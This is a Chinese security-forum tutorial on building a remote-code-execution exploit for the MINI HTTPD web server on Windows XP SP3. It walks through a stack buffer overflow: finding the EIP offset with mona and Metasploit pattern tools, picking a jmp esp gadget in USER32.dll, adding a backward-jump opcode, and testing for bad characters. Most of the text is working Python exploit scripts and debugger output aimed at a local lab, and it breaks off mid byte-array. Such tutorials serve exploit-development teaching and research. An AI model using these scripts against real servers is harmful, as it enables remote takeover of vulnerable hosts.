# MINI HTTPD 远程代码执行漏洞EXP编写

> **来源**: https://forum.butian.net/share/2890  
> **文章ID**: 2890

---

MINI HTTPD 远程代码执行漏洞EXP编写
========================

测试环境
----

测试环境：Windows XP Home with Service Pack 3 (x86)  
调试软件：[Immunity Debugger(x86)](https://github.com/10cks/MINI-HTTPD-RCE-ENV)/[mona](https://github.com/corelan/mona)

操作系统及其他工具下载请查看前文

！！注意！！：本文主要使用的是Python2

使用工具
----

[Python 2.7.1](https://www.python.org/downloads/release/python-271/)

EXP编写
-----

### 偏移计算

书接上文，查看系统是否开启DEP，当前系统已默认设置为系统服务开启DEP，如果看到开启了所有程序的话就勾选下面的选项，我们先关闭该选项在无DEP下实现exp，再去实现DEP bypass：

![Pasted image 20240329084646.png](images/attach-8eeee5eadec14e1d2a6416fa4bdc0961c76b4b11.png)

测试payload(python2)：

```python
import sys
import socket

# Create the buffer.
buffer = "A" * 1000

HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((HOST, PORT))  
s.send(req)  
data = s.recv(1024)  
s.close()  
print 'Received', repr(data)
```

上篇文章我们使用的是字符串，本文使用的是字节串。  
Python3 对应代码：

```python
import sys
import socket

# Create the buffer.
buffer = b"A" * 1000

HOST = '127.0.0.1'
PORT = 80

req = b"GET /" + buffer + b"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect((HOST, PORT))  
s.send(req)
data = s.recv(1024)  
s.close()
print('Received', repr(data))
```

使用Immunity Debugger附加mini\_httpd进程，运行payload，可以看到正在访问非法区域：

![Pasted image 20240329100334.png](images/attach-e06fa7c5dcf0d86c57086ade02c036d9aaef7459.png)

这里可以看出我们可以控制EIP，我们使用mona.py插件（这个文件下载后放到python2.7目录下）可以查找覆盖保存的EIP所需要的偏移量，因为EIP是只读寄存器，我们需要覆盖ret的在堆栈中对应的值。  
先设置mona，我们可以创建一个1000字节的模板文件用来测试。

在Immunity Debugger中执行下面的指令：

```php
!mona config -set workingfolder c:\logs\%p
!mona config -set workingfolder c:\logs\%p
!mona pc 1000 mona pc 1000
```

之前的poc我们需要修改，来生成一系列唯一的子字符串组合，用来确定在缓冲区溢出攻击中覆盖了特定内存地址的偏移量。在Immunity Debugger中输入：`!mona pattern_create 1000`

![Pasted image 20240329103852.png](images/attach-19e95cb2bb7b87505165cc3cd045984266a641c9.png)

生成的数据会在Immunity Debugger目录的pattern.txt文件中：

![Pasted image 20240329104001.png](images/attach-b9dab81310ffb8403a7072096a6b62ea6ba11eb2.png)

如果直接从Immunity Debugger中进行复制的话，记得确定一下最后复制出来的长度：

![Pasted image 20240329102122.png](images/attach-7dc13bf4f7cd1a4942b2e5f4a825d27093b80d0d.png)

我们写一个新的poc：

```python
import sys
import socket

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
```

一旦执行和程序崩溃，我们使用`!mona findmsp`来查找进程内存中的模式，并计算构建漏洞所需的偏移量。

![Pasted image 20240329102813.png](images/attach-eb0a468e34e614993d07eef0026edf3f3fa62881.png)

我们可以在上图中看到，保存的 EIP 在 967 字节后被覆盖，并且：

```php
 Message=    ESP (0x00c7dc6c) points at offset 971 in normal pattern (length 29)
```

- `ESP (0x00c7dc6c)` 表示栈指针寄存器当前的值或地址。
- `points at offset 971` 表示ESP指向了循环模式中的偏移量971。换句话说，当程序崩溃时，位于循环模式中的第971个字节的位置被加载到了ESP寄存器中，ESP寄存器被覆盖。
- `in normal pattern (length 29)`

这个29是什么？Immunity Debugger我不怎么会用，直接windbg看一下：

```php
0:002> g
(5d0.330): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7e886
eip=67423267 esp=00c7dc6c ebp=0000000e iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
67423267 ??              ???
0:003> dd esp
00c7dc6c  34674233 42356742 67423667 38674237
00c7dc7c  42396742 68423068 32684231 54544842
00c7dc8c  2e315c50 41365b31 71413771 39714138
00c7dc9c  41307241 72413172 33724132 41347241
00c7dcac  72413572 37724136 41387241 73413972
00c7dcbc  31734130 41327341 73413373 35734134
00c7dccc  41367341 73413773 39734138 41307441
00c7dcdc  74413174 33744132 41347441 74413574
0:003> dc esp
00c7dc6c  34674233 42356742 67423667 38674237  3Bg4Bg5Bg6Bg7Bg8
00c7dc7c  42396742 68423068 32684231 54544842  Bg9Bh0Bh1Bh2BHTT
00c7dc8c  2e315c50 41365b31 71413771 39714138  P\1.1[6Aq7Aq8Aq9
00c7dc9c  41307241 72413172 33724132 41347241  Ar0Ar1Ar2Ar3Ar4A
00c7dcac  72413572 37724136 41387241 73413972  r5Ar6Ar7Ar8Ar9As
00c7dcbc  31734130 41327341 73413373 35734134  0As1As2As3As4As5
00c7dccc  41367341 73413773 39734138 41307441  As6As7As8As9At0A
00c7dcdc  74413174 33744132 41347441 74413574  t1At2At3At4At5At
```

下面标记部分为29字节，这也是我们目前的可控范围：

![Pasted image 20240329105513.png](images/attach-02c1a8fa585f74603368d1810a733a618c31519e.png)

改buffer的长度为1500，ESP上则有105字节可控;2000也是105，应该是极限了：

![Pasted image 20240329134652.png](images/attach-a1b449e829607947881e38669d824f69d359b265.png)

1500的寄存器偏移为：

![Pasted image 20240329143423.png](images/attach-3d5faf60982d2474e2079f9939c5c55dc0d2e29d.png)

下一步是验证偏移量，使用下面的poc：

```python
import sys
import socket

offset_eip = 967
EIP = 'BBBB'
ESP = 'CCCC'
ESI = 'DDDD'
buffer = 'A' * 225
buffer += ESI
buffer += 'A' * (offset_eip – len(buffer))
buffer += EIP
buffer += ESP
buffer += 'E' * (1500 – len(buffer))
HOST = '127.0.0.1'
PORT = 80

# 下面与之前的代码相同
req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
```

运行这个poc，再查看寄存器：

![Pasted image 20240329142440.png](images/attach-b626ea8cc7a4c40a8bf35a486ca759b55e67cf1b.png)

![Pasted image 20240329141434.png](images/attach-06ebf42a46774286360799d5dd063f50dc13bda1.png)

```php
EAX 00000000
ECX 7C90F641 ntdll.7C90F641
EDX 00000007
EBX 000000C8
ESP 00C7DC6C ASCII "CCCCEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE127.000.000.001  GET AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EBP 0000000E
ESI 00C7DD66 ASCII "DDDDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
EDI 00C7FF53
EIP 42424242
```

正如我们所看到的，EIP 等于`"42424242"(BBBB)`；ESP 指向以`"CCCC"`开头的内存区域，后跟一组 E；ESI 指向包含`"DDDD"`的内存，后跟一组 A。对于偏移的填充符合我们的预期。

### 指令构造

操作系统使用的是Windows XP SP3，之前默认开了DEP，我们将这个先关掉。我们构造指令的方法是在EIP覆盖之前将shellcode注入到栈上，然后使用`jmp esp`的ROP gadget，让指令跳转到shellcode上。  
首先，我们需要找到jmp esp：

```php
!mona jmp –r esp
```

生成的结果会在jmp.txt文件中：

![Pasted image 20240329144503.png](images/attach-bd3298357752aa48755a94e50dd2bdb07af2d9f2.png)

要构建可靠的漏洞利用，最好在程序本身或者其中一个dll中使用指令，来保证漏洞利用适用于不同的windows版本，minihttpd.exe没有我们需要的gadget，这里我们使用`C:\WINDOWS\system32\USER32.dll`，地址为`0x7e4456f7`：

```php
0x7e4456f7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll), 0x0
0x7e455af7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, CFG: False, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll), 0x0
```

我们修改之前的poc，将此地址放在 EIP 上（由于Intel架构，需要使用小端序），`struct.pack('<I', 0x7e4456f7)`这行代码表示的意思是将整数`0x7e4456f7`按照小端字节序（`<`表示小端字节序，`I`表示无符号整形数，占4字节）转换为字节流，并在 ESP 上放置一些断点`\xcc`让指令跳转到esp后停止，来检测我们是否修改成功。

```python
import sys
import socket
import struct

offset_eip = 967
EIP = struct.pack('<I', 0x7e4456f7) # jmp esp : USER32.dll
ESP = '\xcc\xcc\xcc\xcc'
buffer = 'A' * offset_eip
buffer += EIP
buffer += ESP
buffer += 'E' * (1500 - len(buffer))
HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
```

可以看到中断成功：

![Pasted image 20240329151412.png](images/attach-317b81b16d8dfcee4a0b5d05e9cb5deedf1da6f4.png)

下一步是将 ESP 指向的向后跳跃的操作码放在内存上。为了获得该操作码，我们将使用Metasm，这是Metasploit-framework中的一个工具。我们知道执行是在 ESP 上，所以缓冲区的开始是 971 字节之前。使用metasm，我们得到 971 字节向后跳转的操作码。

> ruby的使用过程中可能出现依赖问题，可以使用rvm来创建独立环境

```bash
computer@ubuntu:~/Desktop$ locate nasm_shell.rb
/opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb

# ruby 3.0.5
# gem install pcaprub -v 0.13.1
# gem install packetfu -v 2.0.0

┌──(name㉿kali)-[/opt/metasploit-framework/embedded/framework]
└─$ /opt/metasploit-framework/embedded/framework/tools/exploit/nasm_shell.rb
nasm > jmp $-971
00000000  E930FCFFFF        jmp 0xfffffc35
```

当前poc为：

```python
import sys
import socket
import struct

offset_eip = 967
EIP = struct.pack('<I', 0x7e4456f7) # jmp esp : USER32.dll gadget
ESP = '\xe9\x30\xfc\xff\xff' # jmp $-971: 0xE930FCFFFF
shellcode = '\xcc' * 20
buffer = shellcode
buffer += 'A' * (offset_eip - len(buffer))
buffer += EIP
buffer += ESP
buffer += 'E' * (1500 - len(buffer))

# buffer = '\xcc'*20 + 'A'*947 + '0x7e4456f7'(4 bytes) + '\xe9\x30\xfc\xff\xff'(5 bytes) --> 976 bytes

HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
```

接下来使用Immunity Debugger进行调试，在`0x7e4456f7`下一个断点，来逐步跟踪执行并确定我们跳转的位置。在主界面使用`ctrl+G`，然后输入`0x7e4456f7`，F2下断点，接着运行F7(Step into)，我这边用windbg查看的，可以看到在没开启DEP的时候我们顺利跳转到栈上执行命令了：

![Pasted image 20240330135226.png](images/attach-8c7bbba2dc2dbba7f4cac1f2190c461b8e687735.png)

![Pasted image 20240330145622.png](images/attach-0a68966029b9bab6a62f21d180d21f5d087fb5d2.png)

![Pasted image 20240330134500.png](images/attach-98f3ae0ade7bfd634bb5926321449af96935c38c.png)

```php
0:002> g
Breakpoint 0 hit
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7ff53
eip=7e4456f7 esp=00c7dc6c ebp=0000000e iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
USER32!DeregisterShellHookWindow+0x5437:
7e4456f7 ffe4            jmp     esp {00c7dc6c}
0:003> p
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7ff53
eip=00c7dc6c esp=00c7dc6c ebp=0000000e iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
00c7dc6c e930fcffff      jmp     00c7d8a1
0:003> dc 00c7d8a1
00c7d8a1  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00c7d8b1  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00c7d8c1  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00c7d8d1  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00c7d8e1  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00c7d8f1  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00c7d901  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
00c7d911  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
0:003> p
eax=00000000 ebx=000000c8 ecx=7c90f641 edx=00000007 esi=00c7dd66 edi=00c7ff53
eip=00c7d8a1 esp=00c7dc6c ebp=0000000e iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
00c7d8a1 41              inc     ecx
```

可以看到，现在我们利用gadget执行esp指向的地址，esp指向的地址已经被我们覆盖为`jmp $-971`的指令了，所以跳转到一个充满A的区域，但并不是在缓冲区开头，我们用pattern确定一下我们落在了哪里，此处使用msf自带的脚本生成pattern字符串：

```bash
┌──(name㉿kali)-[/opt/metasploit-framework/embedded/framework]
└─$ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 967
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1B
```

修改poc：

```python
import sys
import socket
import struct

offset_eip = 967
EIP = struct.pack('<I', 0x7e4456f7) # jmp esp : USER32.dll gadget
ESP = '\xe9\x30\xfc\xff\xff' # jmp $-971: 0xE930FCFFFF
shellcode = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1B"
buffer = shellcode
buffer += 'A' * (offset_eip - len(buffer))
buffer += EIP
buffer += ESP
buffer += 'E' * (1500 - len(buffer))

# buffer = '\xcc'*20 + 'A'*947 + '0x7e4456f7' + '\xe9\x30\xfc\xff\xff'

HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)

```

我们会跳转到"3Av4"这个地方：

![Pasted image 20240330150615.png](images/attach-1c5217149b8a19b590dc8e50051458ab5ef94f82.png)

使用mona寻找偏移量：

```php
!mona po 3Av4
```

也可以直接找"3Av4"前面占了多少字节：

```php
>>> len("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av")
641
```

我们这里使用631作为shellcode的偏移（其实641也一样的）：

![Pasted image 20240331144113.png](images/attach-a5722e5317c2a94f1a34fc1c9a4cdc9260996869.png)

### 检测坏字符

现在，我们可以使用msf来创建一个shellcode并将其注入漏洞利用中，但首先我们需要找出坏字符（我们不能在缓冲区上使用的字节，因为它们会破坏漏洞利用）。  
为了找出坏字符，我们使用`!mona bytearray`选项。这将在工作文件夹上创建两个文件，一个bytearray.txt包含要进行攻击的数组，另一个bytearray.bin，一个使用`!mona compare`命令与内存中的数组进行比较的文件。如果内存上的数组与文件上的数组不同，mona会告诉我们是什么字节导致了不同，并且可以在没有这些字节的情况下重新制作数组。一旦从数组中剥离了所有错误字符，mona会告诉我们内存上的数组是“未修改的”。  
当我们攻击Web服务器时，我们已经可以排除一些我们知道会破坏url的字符，例如空字节、空格、`/`符号和`?`符号。  
我们使用命令`!mona bytearray -cpb "\x00\x20\x2f\x3f"`生成第一个字节数组，在我们的漏洞利用中复制该数组，并在`jmp esp`上放置断点执行进行调试分析。

`!mona bytearray -cpb "\x00\x20\x2f\x3f"`:  
`–cpb` 参数表示“Create Pattern Bytearray”，它后面跟着的字符串`\x00\x20\x2f\x3f`是需要排除的字节。

- `\x00` 通常被排除，因为它是字符串结束符（null byte），它可能会导致基于字符串的函数（如strcpy）提前结束。
- `\x20` 是空格字符，在某些情况下可能会被用作分隔符，导致输入被拆分。
- `\x2f` 是正斜杠`/`，在URL或文件路径中被用作分隔符。
- `\x3f` 是问号`?`，在URL中用来标示查询参数的开始。

![Pasted image 20240330164631.png](images/attach-b018ae3ce349601e7b040fd141711a6fd4505c23.png)

```python
import sys
import socket
import struct

offset_eip = 967
offset_shellcode = 641
EIP = struct.pack('<I', 0x7e4456f7) # jmp esp ntdll.dll
ESP = '\xe9\x26\xfc\xff\xff'
buffer = 'A' * offset_shellcode
shellcode = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21"
"\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x40\x41\x42\x43"
"\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63"
"\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83"
"\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3"
"\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3"
"\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buffer += shellcode
buffer += 'A' * (offset_eip - len(buffer))
buffer += EIP
buffer += ESP
buffer += 'E' * (1500 - len(buffer))
HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
```

执行后，我们可以看到EIP等于"45454545"，访问冲突。这是因为某些字符串破坏了我们的缓冲区（正常的话应该是`jmp esp`），并且覆盖EIP的偏移量已经更改。

![Pasted image 20240330202849.png](images/attach-ee3abc307496f396718ac2c703ab2db49d643293.png)

0x0e处有截断，前面的0x0d可能是坏字符。

![Pasted image 20240330215714.png](images/attach-7f704c675e07628796fa59b160bca92b7002646a.png)

重新生成检测的bytearray：

```php
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x21\x22"
"\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x40\x41\x42\x43\x44"
"\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64"
"\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84"
"\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4"
